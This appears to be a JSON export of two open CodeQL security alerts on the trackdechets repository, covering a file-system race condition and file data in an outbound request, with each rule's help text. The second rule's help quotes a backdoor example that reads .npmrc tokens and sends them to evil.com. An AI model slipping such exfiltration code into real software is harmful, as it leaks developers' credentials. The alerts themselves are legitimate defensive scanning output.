{"totalCount":2,"grade":"D","repositories":[{"url":"https://github.com/MTES-MCT/trackdechets","grade":"D","alerts":[{"number":159,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/159","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-system-race","severity":"warning","description":"Potential file system race condition","name":"js/file-system-race","tags":["external/cwe/cwe-367","security"],"full_description":"Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.","help":"# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a6d0b3836a94ce08cab54b1b415a180bd92a0061","message":{"text":"The file may have changed since it was checked."},"location":{"path":"libs/back/scripts/src/generate.ts","start_line":39,"end_line":39,"start_column":3,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/159/instances"},{"number":158,"created_at":"2024-10-14T12:27:13Z","updated_at":"2024-10-14T12:27:15Z","url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158","html_url":"https://github.com/MTES-MCT/trackdechets/security/code-scanning/158","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-access-to-http","severity":"warning","description":"File data in outbound network request","name":"js/file-access-to-http","tags":["external/cwe/cwe-200","security"],"full_description":"Directly sending file data in an outbound network request can indicate unauthorized information disclosure.","help":"# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.2"},"most_recent_instance":{"ref":"refs/heads/dev","analysis_key":"dynamic/github-code-scanning/codeql:analyze","environment":"{\"build-mode\":\"none\",\"category\":\"/language:javascript-typescript\",\"language\":\"javascript-typescript\",\"runner\":\"[\\\"ubuntu-22.04\\\"]\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"a6d0b3836a94ce08cab54b1b415a180bd92a0061","message":{"text":"Outbound network request depends on file data."},"location":{"path":"back/src/common/post/backends/mysendingbox/index.ts","start_line":15,"end_line":15,"start_column":7,"end_column":13},"classifications":[]},"instances_url":"https://api.github.com/repos/MTES-MCT/trackdechets/code-scanning/alerts/158/instances"}]}]}